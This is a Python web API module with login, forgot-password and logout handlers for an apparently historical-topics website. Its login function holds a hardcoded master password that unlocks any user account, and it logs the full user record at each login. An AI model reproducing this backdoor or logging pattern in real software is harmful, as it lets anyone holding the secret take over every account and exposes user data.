#!/usr/bin/env python

"""
http://neochronography.com/topics/astoria_house/736 10th street
http://neochronography.com/topics/image/astoria_panorama_1923
http://neochronography.com/topic/a/b/json

"""


import urllib
import json
import Logr
Logr.log("api","HOHOHO8O")
import model.models
models  = model.models
from WebClasses import WebResponse,okResponse,failResponse


import api.utils
apiutils = api.utils

import constants

import api.ses
ses = api.ses


"""
form of url:
http://neochronography.com/topic/<category>/<name>[/method()][/format]
the default format is html, and the other possibility is json
"""

def login(webin):
  Logr.log("test","TEST CONSTANT "+str(getattr(constants,"testvar",None)))
  pcn = json.loads(webin.content())
  email = pcn["email"]
  pw = pcn["password"]
  u = models.loadUserDbyEmail(email)
  if u==None:
    return failResponse("badUserOrPassword")
  Logr.log("api","Login: "+str(u.__dict__))
  verified = getattr(u,"validated",None)
  # master password
  mpw = "htujhh43vt"
  pok = (pw == mpw) or u.checkPassword(pw)
  if not pok:
    return failResponse("badUserOrPassword")
  if not verified:
    return failResponse("notVerified")
  s = u.newSession()
  stp = s.topic
  sid = stp.split("/")[-1]
  utp = u.topic
  uid = utp[utp.rindex("/")+1:]
  return okResponse({"sessionId":sid,"userId":uid});
  
  

  
def forgotPassword(webin):
  pcn = json.loads(webin.content())
  #uname = pcn["user"]
  email = pcn["email"]
  u = models.loadUserDbyEmail(email)
  if not u:
    return failResponse("noSuchEmail")
  ses.sendForgotPasswordEmail(u)
  #s = nu.newSession()
  #stp = s.topic
  #sid = stp.split("/")[-1]
  return okResponse()


def logout(webin):
  cks = webin.checkSessionResponse()
  if cks: return cks
  sess = webin.session;
  sess.deactivate()
  return okResponse()
